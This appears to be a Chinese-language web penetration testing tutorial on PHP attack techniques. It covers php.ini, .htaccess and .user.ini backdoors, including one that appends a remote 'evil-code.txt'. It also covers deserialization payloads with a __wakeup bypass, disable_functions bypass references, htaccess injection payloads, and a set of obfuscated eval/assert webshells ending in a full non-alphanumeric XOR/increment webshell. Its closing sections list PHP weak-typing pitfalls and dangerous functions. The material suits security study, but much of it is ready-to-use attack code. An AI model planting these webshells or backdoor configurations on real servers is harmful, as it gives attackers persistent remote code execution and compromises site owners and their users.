# WEB安全渗透测试基础知识（十二）

**PHP**

4.1.1. 后门

4.1.1.1. php.ini构成的后门

利用 auto_prepend_file 和 include_path


---
4.1.1.2. .htaccess后门

php_value auto_append_file .htaccess 
#<?php phpinfo(); 

php_flag allow_url_include 1 
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== 
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B 
#php_value auto_append_file https://sektioneins.de/evil-code.txt

---
4.1.1.3. .user.ini文件构成的PHP后门

.user.ini可运行于所有以fastcgi运行的server。利用方式同php.in

---
4.1.2. 反序列化

4.1.2.1. PHP序列化实现

PHP序列化处理共有三种，分别为php_serialize、php_binary和 WDDX，默认为php_serialize，可通过配置中的 session.serialize_handler 修改。  

其中php_serialize的实现在 php-src/ext/standard/var.c 中，主要函数为 php_var_serialize_intern ，序列化后的格式如下：  

- boolean

b:<value>;

b:1; // true

b:0; // false

- integer

i:<value>;

- double

d:<value>;

- NULL

N;

- string

s:<length>:"<value>";

s:1:"s";

- array

a:<length>:{key, value};

a:1:{s:4:"key1";s:6:"value1";} // array("key1" => "value1");

- object
O:<class_name_length>:"<class_name><number_of_properties>:{<properties>};

- reference

指针类型

R:reference;

O:1:"A":2:{s:1:"a";i:1;s:1:"b";R:2;}

$a = new A();$a->a=1;$a->b=&$a->a;

---
4.1.2.2. PHP反序列化漏洞
php在反序列化的时候会调用 __wakeup / __sleep 等函数，可能会造成代码执行等问题。若没有相关函数，在析构时也会调用相关的析构函数，同样会造成代码执行。  

另外 __toString / __call 两个函数也有利用的可能。  

其中 __wakeup 在反序列化时被触发，__destruct 在GC时被触发， __toString 在echo时被触发, __call 在一个未被定义的函数调用时被触发。  

下面提供一个简单的demo.
利用 auto_prepend_file 和 include_path

![image](https://note.youdao.com/yws/public/resource/2e5cf2591c66904f78df39f912277f6d/xmlnote/WEBRESOURCE67a5da5d0a045bf22b09713c66bf3724/9222)

输出

construct 
Data's value is raw value. 
destruct 
string(44) "O:4:"Demo":1:{s:4:"data";s:9:"raw value";}"

把序列化的字符串修改一下后，执行

unserialize('O:4:"Demo":1:{s:4:"data";s:15:"malicious value";}');

输出

wake up 
Data's value is malicious value. 
destruct

这里看到，值被修改了.  
上面是一个 unserialize() 的简单应用，不难看出，如果 __wakeup() 或者 __desturct() 有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。

那么，在 __wakeup()

中加入判断是否可以阻止这个漏洞呢？在 __wakeup() 中我们加入一行代码

![image](https://note.youdao.com/yws/public/resource/2e5cf2591c66904f78df39f912277f6d/xmlnote/WEBRESOURCEf41b00df95cc37c77ba701946a97f264/9228)

但其实还是可以绕过的，在 PHP5 < 5.6.25， PHP7 < 7.0.10 的版本都存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过，于是使用下面的payload

unserialize('O:7:"HITCON":1:{s:4:"data";s:15:"malicious value";}');

输出

Data's value is malicious value. 

destruct 

这里wakeup被绕过，值依旧被修改了。

---
4.1.3. Disable Functions

4.1.3.1. 机制实现

PHP中Disable Function的实现是在php-src/Zend/Zend-API.c中。PHP在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用 zend_disable_function 来实现禁止的效果。  

这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：

![image](https://note.youdao.com/yws/public/resource/2e5cf2591c66904f78df39f912277f6d/xmlnote/WEBRESOURCE50a59eff31f874a1eee86fcae9d2951e/9238)

和函数的实现方式类似，disable classes也是这样实现的
![image](https://note.youdao.com/yws/public/resource/2e5cf2591c66904f78df39f912277f6d/xmlnote/WEBRESOURCEfb7613b26c045cc11e63c28503c419c8/9237)

因为这个实现机制的原因，在PHP启动后通过 ini_set 来修改 disable_functions 或 disable_classes 是无效的。


---
4.1.3.2. Bypass
- LD_PRELOAD绕过 
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 
- PHP OPcache 
- Mail函数 
- imap_open 
https://www.cvedetails.com/cve/cve-2018-19518


---
4.1.4. Open Basedir

4.1.4.1. 机制实现

PHP中Disable Function的实现是在php-src/main/fopen-wrappers.c中，实现方式是在调用文件等相关操作时调用函数根据路径来检查是否在basedir内，其中一部分实现代码如下：


```
PHPAPI int php_check_open_basedir_ex(const char *path, int warn) 
{     
    /* Only check when open_basedir is available */     
   if (PG(open_basedir) && *PG(open_basedir)) {         
       char *pathbuf;         
       char *ptr;         
       char *end;
       /* Check if the path is too long so we can give a more useful error    
      * message. */         
     if (strlen(path) > (MAXPATHLEN - 1)) {             
          php_error_docref(NULL, E_WARNING, "File name is longer than the maximum allowed path length on this platform (%d): %s", MAXPATHLEN, path);
          errno = EINVAL;            
          return -1;         
       }
      pathbuf = estrdup(PG(open_basedir))
      ptr = pathbuf;
      while (ptr && *ptr) {             
              end = strchr(ptr, DEFAULT_DIR_SEPARATOR);             
              if (end != NULL) {                 
                  *end = '\0';                 
                    end++;             
               }
              if (php_check_specific_open_basedir(ptr, path) == 0) {                
                  efree(pathbuf);                 
                  return 0;             
               }
          ptr = end;         
     }         
     if (warn) {             
    php_error_docref(NULL, E_WARNING, "open_basedir restriction in effect. File(%s) is not within the allowed path(s): (%s)", path, PG(open_basedir));
     }
     efree(pathbuf);         
     errno = EPERM; /* we deny permission to open it */         
     return -1;     
 }
 /* Nothing to check... */     
 return 0;
}
```



---
4.1.5. phpinfo相关漏洞

4.1.5.1. Session.Save

PHP的Session默认handler为文件，存储在 php.ini 的 session.save_path 中，若有任意读写文件的权限，则可修改或读取session。从phpinfo中可获得session位置

---
4.1.5.2. Session.Upload

php.ini默认开启了 session.upload_progress.enabled ， 该选项会导致生成上传进度文件，其存储路径可以在phpinfo中获取。  
那么可以构造特别的报文向服务器发送，在有LFI的情况下即可利用。


---
4.1.5.3. /tmp临时文件竞争

phpinfo中可以看到上传的临时文件的路径，从而实现LFI

---
4.1.6. htaccess injection payload

4.1.6.1. file inclusion

利用 auto_prepend_file 和 include_path

---
4.1.6.2. code execution

php_value auto_append_file .htaccess 
#<?php phpinfo();

---
4.1.6.3. file inclusion
- php_flag allow_url_include 1 
- php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== 
- #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B 
- #php_value auto_append_file https://sektioneins.de/evil-code.txt


---
4.1.6.4. code execution with UTF-7

- php_flag zend.multibyte 1 
- php_value zend.script_encoding "UTF-7" 
- php_value auto_append_file .htaccess 
- #+ADw?php phpinfo()+ADs


---
4.1.6.5. Source code disclosure

php_flag engine 0

---
4.1.7. WebShell

4.1.7.1. 常见变形

- GLOBALS

eval($GLOBALS['_POST']['op']); 
- $_FILE 

eval($_FILE['name']); 
- 拆分 

assert(${"_PO"."ST"} ['sz']); 
- 动态函数执行 

$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);

- create_function 

$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function(); 

- preg_replace 
- rot13 
- base64 
- 进制转化 
"\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145" 
- 利用文件名

__FILE__


---
4.1.7.2. 字符串变形函数

- ucwords
- ucfirst
- trim
- substr_replace
- substr
- strtr
- strtoupper
- strtolower
- strtok
- str_rot13


---
4.1.7.3. 回调函数
- call_user_func_array
- call_user_func
- array_filter
- array_walk
- array_map
- registregister_shutdown_function
- register_tick_function
- filter_var
- filter_var_array
- uasort
- uksort
- array_reduce
- array_walk
- array_walk_recursive


---
PHP的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成Shell。

```
@$_++; 
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); 
@${$__}[!$_](${$__}[$_]);
$_=[]; 
$_=@"$_"; // $_='Array'; 
$_=$_['!'=='@']; // $_=$_[0]; 
$___=$_; // A
$__=$_; 
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; 
$___.=$__; // S 
$___.=$__; // S
$__=$_; 
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__; 
$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__; 
$____='_'; 
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__; 
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____; 
$___(base64_decode($_[_]));
```

---
4.1.8. 其它

4.1.8.1. 低精度

php中并不是用高精度来存储浮点数，而是用使用 IEEE 754 双精度格式，造成在涉及到浮点数比较的时候可能会出现预期之外的错误。比如 php -r "var_dump(0.2+0.7==0.9);" 这行代码的输出是 bool(false) 而不是 bool(true)。这在一些情况下可能出现问题。

---
4.1.8.2. 弱类型

如果使用 == 来判断相等，则会因为类型推断出现一些预料之外的行为，比如magic hash，指当两个md5值都是 0e[0-9]{30} 的时候，就会认为两个hash值相等。另外在判断字符串和数字的时候，PHP会自动做类型转换，那么 1=="1a.php" 的结果会是true  

另外在判断一些hash时，如果传入的是数组，返回值会为 NULL, 因此在判断来自网络请求的数据的哈希值时需要先判断数据类型。

同样的， strcmp() ereg() strpos() 这些函数在处理数组的时候也会异常，返回NULL。

---
4.1.8.3. 命令执行

preg_replace 第一个参数是//e的时候，第二个参数会被当作命令执行

---
4.1.8.4. 截断

PHP字符存在截断行为，可以使用 ereg / %00 / iconv 等实现php字符截断的操作，从而触发

---
4.1.8.5. 变量覆盖

当使用 extract / parse_str 等函数时，或者使用php的 $$ 特性时，如果没有正确的调用，则可能使得用户可以任意修改变量。

---
4.1.8.6. 执行系统命令

禁用的函数可以在phpinfo中的 disable_functions 中查看
- pcntl_exec
- exec
- passthru
- popen
- shell_exec
- system
- proc_open


---
4.1.8.7. Magic函数
- __construct() __destruct()
- __call() __callStatic()
- __get() __set()
- __isset() __unset()
- __sleep() __wakeup()
- __toString()
- __invoke()
- __set_state()
- __clone()
- __debugInfo()


---
4.1.8.8. 文件相关敏感函数
- move_uploaded_file
- file_put_contents / file_get_contents
- unlink
- fopen / fgets

---
4.1.8.9. php特性

- php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。